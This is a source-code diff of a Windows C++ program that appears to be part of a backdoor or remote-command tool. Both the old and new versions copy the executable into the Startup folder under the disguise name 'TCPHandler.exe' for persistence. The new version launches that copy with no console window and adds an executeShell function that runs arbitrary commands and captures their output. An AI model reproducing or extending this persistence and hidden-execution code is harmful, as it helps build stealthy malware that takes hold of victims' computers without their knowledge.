@@ -1,73 +1,72 @@
-#include<iostream>
-#include <windows.h>
-#include <string>
-#include <thread>
-#include <windows.h>
-#include <memory>
-#include <stdexcept>
-#include <array>
-#include <fstream>
-#define UNICODE
-#include <AtlBase.h>  
-#include <AtlCom.h>
-#include <UIAutomation.h>
-#include <atlstr.h>
+#define _CRT_SECURE_NO_WARNINGS
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
-int startUpMenu(char* filepath)
+#include "Utils.h"
+
+std::string startUpPath = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TCPHandler.exe";
+
+bool isInStartUp(char* filePath)
 {
-    const char* dst = "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TCPHandler.exe"; // %APPDATA% is saved by windows,
-                                                                                               //so the path is compatable for every computer
-    WCHAR src[MAX_PATH] = { 0 };
-    const char* filename = "TCPHandler.exe"; // the name of the file i put in the start menu
-    std::string filePath(filepath);
-    std::string fileName(filePath.substr(filePath.size() - 14, filePath.size()));   // i take the fixed size of the name i gave the file i put in the start menu
+    std::string fileName, startUpFileName;
 
-    std::cout << "file name: " << fileName.c_str() << std::endl;; // debug
-    GetModuleFileName(NULL, src, MAX_PATH);
+    fileName = std::string(filePath).substr(std::string(filePath).find_last_of("\\"));
+    startUpFileName = startUpPath.substr(startUpPath.find_last_of("\\"));
 
-    if (strcmp(fileName.c_str(), filename) != 0) // here i check if the current running application isn't the one in the backgroung 
-                                                // i do that by checking if the file's name equals the one i give it whe n i copy it to the startup directory
-    {
-        std::string copy = std::string("copy")
-            + " \"" + std::string(CW2A(src)) + "\"" + " \"" + std::string(dst) + "\""; // I surround the path with " " 
-                                                                                // in case the                              
-        std::cout << copy.c_str() << std::endl;
-        system(copy.c_str());
-
-        return 0;
-    }       // the return value tells the program if it should quit after this function or continue
-    return 1;
+    /*checking if the files' names are the same*/
+    return fileName._Equal(startUpFileName);
 }
 
-const char* addSlesh(const char* str)
+void copyToStartUp(char* filePath)
 {
-    char* ret = new char[1024]{ 0 };
-    int i = 0;
-    int j = 0;
-    for (; str[i] != '\0'; i++, j++)
-    {
-        ret[j] = str[i];
-        if (str[i] == '\\')
-        {
-            j++;
-            ret[j] = '\\';
-        }
-    }
-    return ret;
+    std::string command = "copy " + std::string(filePath) + " \"" + startUpPath + "\"";
+    executeShell((char*)command.c_str());
 }
 
-std::string exec(const char* cmd) {
+void executeStartUpFile()
+{
+    // additional information
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+
+    // set the size of the structures
+    memset(&si, 0, sizeof(si));
+    memset(&pi, 0, sizeof(pi));
+    si.cb = sizeof(si);
+    // start the program up
+    if(!CreateProcessA
+    (
+        startUpPath.c_str(),   // the path
+        NULL,                // Command line
+        NULL,                   // Process handle not inheritable
+        NULL,                   // Thread handle not inheritable
+        FALSE,                  // Set handle inheritance to FALSE
+        CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,     // Opens file with no console
+        NULL,           // Use parent's environment block
+        NULL,           // Use parent's starting directory 
+        &si,            // Pointer to STARTUPINFO structure
+        &pi           // Pointer to PROCESS_INFORMATION structure
+    ))
+        return;
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    // Close process and thread handles. 
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
+std::string executeShell(char* cmd) {
     std::array<char, 128> buffer;
     std::string result;
-    //std::cout << cmd << std::endl;
-    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose); // i create a pointer to a "file"
-    Sleep(100);                                                               // then i pipe the output to that "file"
+    /*i create a pointer to a "file"*/
+    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);    
+
+    /*check for errors*/
     if (!pipe)
         throw std::runtime_error("popen() failed!");
+    
+    /*getting the output of the command*/
     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) // I read the data from the buffer 
         result += buffer.data();
-    // that contains the file data
-    //std::cout << result << std::endl;
+   
     return result;
 }
 
